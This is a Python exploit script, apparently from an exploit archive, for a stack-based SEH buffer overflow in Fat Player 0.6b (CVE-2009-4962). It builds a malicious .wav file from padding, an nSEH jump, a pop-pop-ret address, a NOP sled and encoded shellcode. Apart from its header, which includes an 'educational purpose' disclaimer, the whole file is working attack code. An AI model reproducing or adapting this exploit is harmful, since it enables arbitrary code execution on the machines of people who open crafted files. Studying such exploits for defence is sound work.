#################################################################################################
#    	Stack-based buffer overflow in Fat Player 0.6b allows remote attackers to execute 
#	arbitrary code via a long string in a .wav file. NOTE: some of these details are 
#	obtained from third party information.
#
#    Reference:
#    	http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-4962
#    	http://xforce.iss.net/xforce/xfdb/52713
#	http://sourceforge.net/projects/fatplayer/
#	http://www.exploit-db.com/exploits/9495/
#
#    Tested on: Windows XP SP3, FatPlayer 0.6b
#
#
#    This was strictly written for educational purpose. Use it at your own risk.
#    Author will not bare any responsibility for any damages watsoever.
#
#        Author:	Praveen Darshanam
#        Email:		praveen[underscore]recker[at]sify.com
#	 Blog: 		http://darshanams.blogspot.com
#        Date:		10th August, 2010
#
#
#################################################################################################

print "\nFat Player 0.6b WAV File Processing Buffer Overflow (SEH)"

buff1 = "D" * 4132

nseh = "\xeb\x06\x90\x90"
seh_ppr = "\x39\x1f\xd1\x72"
#0x72D11F39      pop edi - pop - retbis	msacm32.drv

noop = "\x90" * 10
code2exec = ("\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05\x7f\xe8\x7b\xca")

buff2 = "Z" * (40000 - len(buff1) - len(nseh) - len(seh_ppr) - len(noop) - len(code2exec))
mal_buff = buff1 + nseh + seh_ppr + noop + code2exec + buff2

try:
	fatpwav = open ("fatplayerboseh.wav","w")
	fatpwav.write(mal_buff)
	fatpwav.close()
	print "\nMalicious WAV File Created . . . !!"
	print "[+] Coded by Praveen Darshanam"
except:
	print "\nUnable to Create File\n"